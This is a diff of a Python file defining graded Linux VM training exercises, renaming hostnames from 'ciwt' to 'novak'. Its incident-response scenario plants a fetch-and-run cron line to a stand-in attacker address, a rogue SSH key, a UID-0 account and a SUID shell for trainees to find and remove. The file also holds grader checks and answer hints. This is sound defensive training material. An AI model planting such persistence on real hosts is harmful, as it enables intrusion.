@@ -21,7 +21,7 @@ def _sha(text):
 
 # --------------------------------------------------------------------------------------------- 1: slow server
 _PERF_ASK = "/root/SR-6110.txt"
-_PERF_SETUP = _prelude("ciwt-app-04") + SYSLOG + r"""mkdir -p /usr/local/bin /opt/payroll /var/run
+_PERF_SETUP = _prelude("novak-app-04") + SYSLOG + r"""mkdir -p /usr/local/bin /opt/payroll /var/run
 cat > /usr/local/bin/thumbgen <<'EOF'
 #!/bin/sh
 # thumbnail generator. Known bug (vendor ticket VND-88): spins at 100% CPU when its queue is empty.
@@ -72,7 +72,7 @@ PERF = {
         {"id": "persist", "text": "Stop cachefill coming back at the next boot: disable /etc/init.d/S60cachefill (remove its execute bit; keep the file)"},
         {"id": "notes", "text": "Write /root/SR-6110.txt with cpu=<process that used the CPU> and mem=<process that held the memory>"},
     ],
-    "intro": "SR-6110 from finance: \"ciwt-app-04 is crawling and the payroll report is due today\". This is a real Linux VM "
+    "intro": "SR-6110 from finance: \"novak-app-04 is crawling and the payroll report is due today\". This is a real Linux VM "
              "and the faults are really running, so the console itself may feel sluggish until you fix it. Work like an "
              "administrator: measure first, change one thing at a time, and do not kill a job the business needs — make "
              "it wait its turn instead. BusyBox tools: top -b -n 1 (one snapshot), ps -o pid,stat,vsz,rss,args, free, "
@@ -81,7 +81,7 @@ PERF = {
                    "memory hog stopped and disabled at boot, findings written up.",
     "initial_state": {},
     "obj_hints": {
-        "boot": ["Start the VM and wait for root@ciwt-app-04:~#.", "Start VM."],
+        "boot": ["Start the VM and wait for root@novak-app-04:~#.", "Start VM."],
         "baseline": ["The load average is the run-queue length over 1, 5 and 15 minutes; free shows used and available memory. "
                      "Record them before you change anything so you can prove the fix.", "uptime ; free"],
         "identify": ["top sorts by CPU; ps can print each process's memory (VSZ/RSS).",
@@ -101,7 +101,7 @@ PERF = {
     "palette": ["uptime", "free", "top -b -n 1 | head -15", "ps -o pid,stat,vsz,rss,args", "kill ", "killall ", "renice -n 15 -p ",
                 "cat /proc/loadavg", "ls -l /etc/init.d", "chmod -x ", "cat /root/SR-6110.txt", "clear"],
     "fallback": ["w11-processes", "linux-shell"],
-    "vm": dict(IMAGE, machines=[_m("vm", "ciwt-app-04", "ciwt-app-04")], setup={"vm": _PERF_SETUP}),
+    "vm": dict(IMAGE, machines=[_m("vm", "novak-app-04", "novak-app-04")], setup={"vm": _PERF_SETUP}),
     "vm_checks": [
         {"id": "boot"},
         {"id": "baseline", "seq": [r"^(uptime|w)\b|loadavg", r"^free\b|meminfo"], "before": r"^(kill|killall|renice)\b|S60cachefill\s+stop",
@@ -141,7 +141,7 @@ def _write(files, d):
     return "".join(f"cat > {d}/{n} <<'EOF'\n{c}EOF\n" for n, c in files.items())
 
 
-_RS_SETUP = _prelude("ciwt-file-03") + SYSLOG + r"""addgroup -g 1500 finance; adduser -D -u 1501 -G finance -h /home/fin fin
+_RS_SETUP = _prelude("novak-file-03") + SYSLOG + r"""addgroup -g 1500 finance; adduser -D -u 1501 -G finance -h /home/fin fin
 mkdir -p /srv/share/finance/budget-2027 /srv/share/hr /backup
 cd /srv/share
 """ + _write(_B15, "finance/budget-2027") + r"""echo 'q4 forecast 1.0' > finance/2026-q4.csv
@@ -187,7 +187,7 @@ RESTORE = {
     "success_msg": "Restored from the newest good backup with owners and modes intact, nothing else overwritten, and the bad backup reported.",
     "initial_state": {},
     "obj_hints": {
-        "boot": ["Start the VM and wait for root@ciwt-file-03:~#.", "Start VM."],
+        "boot": ["Start the VM and wait for root@novak-file-03:~#.", "Start VM."],
         "inspect": ["sha256sum -c re-hashes each file listed in SHA256SUMS and says OK or FAILED. Then look inside a good archive.",
                     "cd /backup ; sha256sum -c SHA256SUMS ; zcat share-20261016-0100.tar.gz | tar -tf -"],
         "restored": ["The 17 Oct archive fails its checksum (and is cut short), so the newest good one is 16 Oct. "
@@ -207,7 +207,7 @@ RESTORE = {
     "palette": ["cd /backup", "ls -l", "cat SHA256SUMS", "sha256sum -c SHA256SUMS", "zcat ", "| tar -tf -", "| tar -xf - -C /tmp/restore ",
                 "cp -a ", "ls -l /srv/share/finance/budget-2027", "cat ", "clear"],
     "fallback": ["ops-backup", "linux-shell"],
-    "vm": dict(IMAGE, machines=[_m("vm", "file-03", "ciwt-file-03")], setup={"vm": _RS_SETUP}),
+    "vm": dict(IMAGE, machines=[_m("vm", "file-03", "novak-file-03")], setup={"vm": _RS_SETUP}),
     "vm_checks": [
         {"id": "boot"},
         {"id": "inspect", "seq": [r"sha256sum\b.*(-c|--check)", r"\btar\s+-?[a-zA-Z]*t[a-zA-Z]*\b"], "before": r"\btar\s+-?[a-zA-Z]*x[a-zA-Z]*\b",
@@ -238,7 +238,7 @@ _WEB_HOSTS = "printf '10.40.0.20 app-05 intranet\\n10.40.0.31 ws-31\\n' >> /etc/
 _WEB_SRV = _prelude("app-05") + SYSLOG + _WEB_HOSTS + r"""ip link set eth0 up; ip addr add 10.40.0.20/24 dev eth0
 apk add -q --no-progress darkhttpd >/dev/null 2>&1
 mkdir -p /srv/www/reports /etc/default
-echo '<h1>CIWT intranet</h1><p>app-05</p>' > /srv/www/index.html
+echo '<h1>Novak intranet</h1><p>app-05</p>' > /srv/www/index.html
 echo '<h1>Q3 report</h1><p>north 41200 / south 38950</p>' > /srv/www/reports/q3.html
 chmod 644 /srv/www/index.html; chmod 600 /srv/www/reports/q3.html
 cat > /etc/default/intranet <<'EOF'
@@ -332,7 +332,7 @@ WEB = {
          "why": "From ws-31, request /reports/q3.html and read the status code before you run chmod on app-05."},
         {"id": "perms", "on": "srv", "sh": "ls -l /srv/www/reports/q3.html | grep -Eq '^-(rw-|r--)r--r-- .* root ' && grep -q 'Q3 report' /srv/www/reports/q3.html",
          "show": "ls -l /srv/www/reports/q3.html | awk '{print $1, $3}'", "why": "q3.html is {v} — the web user (nobody) needs read; nobody else needs write."},
-        {"id": "proof", "on": "ws", "sh": f"[ \"$({_CODE})\" = 200 ] && curl -s -m 3 http://10.40.0.20/ | grep -q 'CIWT intranet'", "secs": 8,
+        {"id": "proof", "on": "ws", "sh": f"[ \"$({_CODE})\" = 200 ] && curl -s -m 3 http://10.40.0.20/ | grep -q 'Novak intranet'", "secs": 8,
          "hist": [r"^\[ws\]\s*(curl|wget)\b.*reports/q3"], "show": f"echo q3=$({_CODE})",
          "why": "From ws-31 the pages do not both return 200 yet ({v})."},
         {"id": "record", "on": "srv", "sh": _ans("bound", "127.0.0.1", _WEB_ASK) + " && " + _ans("code", "403", _WEB_ASK),
@@ -449,9 +449,9 @@ NAT = {
 
 # --------------------------------------------------------------------------------------------- 5: compromised host triage
 _IR_ASK = "/root/IR-6410.txt"
-_KEY_OK = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHq3bZp0deployKeyCIWTbuildPipeline0000000001 deploy@ciwt-build"
+_KEY_OK = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHq3bZp0deployKeyNovakBuildPipeline000000001 deploy@novak-build"
 _KEY_BAD = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM9xUnknownKeyAddedAt0217NotInCMDB00000000077 x@kali"
-_IR_SETUP = _prelude("ciwt-web-07") + SYSLOG + rf"""mkdir -p /root/.ssh /var/tmp/.cache /usr/local/bin /var/spool/cron/crontabs
+_IR_SETUP = _prelude("novak-web-07") + SYSLOG + rf"""mkdir -p /root/.ssh /var/tmp/.cache /usr/local/bin /var/spool/cron/crontabs
 printf '%s\n%s\n' '{_KEY_OK}' '{_KEY_BAD}' > /root/.ssh/authorized_keys; chmod 700 /root/.ssh; chmod 600 /root/.ssh/authorized_keys
 printf '#!/bin/sh\ntar -c -f /var/backups/www.tar /srv/www 2>/dev/null\n' > /usr/local/bin/backup.sh; chmod 755 /usr/local/bin/backup.sh
 printf '30 2 * * * /usr/local/bin/backup.sh\n*/5 * * * * wget -q -O- http://203.0.113.66/u.sh | sh  # system update\n' | crontab -
@@ -482,7 +482,7 @@ INCIDENT = {
         {"id": "suid", "text": "Find the SUID shell the attacker left (find / -xdev -perm -4000) and remove its SUID bit"},
         {"id": "report", "text": "Write /root/IR-6410.txt with ip=<attacker address>, port=<backdoor port> and account=<rogue account>"},
     ],
-    "intro": "IR-6410 (security, high): the IDS flagged ciwt-web-07 talking to 203.0.113.66. Your role is first responder: "
+    "intro": "IR-6410 (security, high): the IDS flagged novak-web-07 talking to 203.0.113.66. Your role is first responder: "
              "preserve the evidence, contain, remove persistence and hand over a report — investigators may need to show "
              "the evidence was collected before anything was changed. This is a real Linux VM with the backdoors really "
              "in place (they are harmless inside this VM). Useful: ss -tlnp, ps -o pid,args, crontab -l, "
@@ -490,7 +490,7 @@ INCIDENT = {
     "success_msg": "Host contained: evidence hashed first, listener stopped, cron downloader, rogue key, UID-0 account and SUID shell removed, legitimate jobs kept, report filed.",
     "initial_state": {},
     "obj_hints": {
-        "boot": ["Start the VM and wait for root@ciwt-web-07:~#.", "Start VM."],
+        "boot": ["Start the VM and wait for root@novak-web-07:~#.", "Start VM."],
         "evidence": ["Copy first, hash second, change third. Save command output with > file.",
                      "mkdir -p /root/evidence ; cd /root/evidence ; crontab -l > crontab.txt ; cp -p /root/.ssh/authorized_keys /etc/passwd . ; "
                      "ss -tlnp > ss.txt ; ps -o pid,args > ps.txt ; sha256sum * > SHA256SUMS ; cd"],
@@ -512,7 +512,7 @@ INCIDENT = {
                 "find / -xdev -perm -4000 2>/dev/null", "mkdir -p /root/evidence", "sha256sum * > SHA256SUMS", "killall ", "sed -i ",
                 "chmod u-s ", "grep 203.0.113.66 /var/log/messages", "clear"],
     "fallback": ["sec-malware", "linux-shell"],
-    "vm": dict(IMAGE, machines=[_m("vm", "ciwt-web-07", "ciwt-web-07")], setup={"vm": _IR_SETUP}),
+    "vm": dict(IMAGE, machines=[_m("vm", "novak-web-07", "novak-web-07")], setup={"vm": _IR_SETUP}),
     "vm_checks": [
         {"id": "boot"},
         {"id": "evidence", "sh": f"cd {_IR_EV} && sha256sum -c SHA256SUMS && grep -rq 'x@kali' . && grep -rq '203\\.0\\.113\\.66' . "
@@ -523,10 +523,10 @@ INCIDENT = {
          "show": "ss -tlnp | grep 31337 | grep -o 'users:.*' | head -1", "why": "Something still listens on the backdoor port: {v}"},
         {"id": "cron", "sh": "! crontab -l 2>/dev/null | grep -q 203.0.113.66 && crontab -l | grep -Eq '^30[[:space:]]+2[[:space:]].*/usr/local/bin/backup\\.sh'",
          "show": "crontab -l 2>&1 | grep -v '^#' | tr '\\n' ' '", "why": "root's crontab: {v}"},
-        {"id": "keys", "sh": "! grep -q 'x@kali' /root/.ssh/authorized_keys && grep -q 'deploy@ciwt-build' /root/.ssh/authorized_keys "
+        {"id": "keys", "sh": "! grep -q 'x@kali' /root/.ssh/authorized_keys && grep -q 'deploy@novak-build' /root/.ssh/authorized_keys "
                              "&& ls -l /root/.ssh/authorized_keys | grep -q '^-rw------- '",
          "show": "awk '{print $NF}' /root/.ssh/authorized_keys 2>&1 | tr '\\n' ' '; ls -l /root/.ssh/authorized_keys | cut -c1-10",
-         "why": "authorized_keys: {v} (only deploy@ciwt-build, mode -rw-------)."},
+         "why": "authorized_keys: {v} (only deploy@novak-build, mode -rw-------)."},
         {"id": "account", "sh": "[ \"$(awk -F: '$3==0{print $1}' /etc/passwd | tr '\\n' ' ')\" = 'root ' ]",
          "show": "awk -F: '$3==0{print $1}' /etc/passwd | tr '\\n' ' '", "why": "UID-0 accounts: {v}"},
         {"id": "suid", "sh": "[ ! -u /var/tmp/.cache/.sh ]", "hist": [r"^find\b.*-perm\s+(-4000|/4000|-u\+s|/u\+s|-u=s)"],
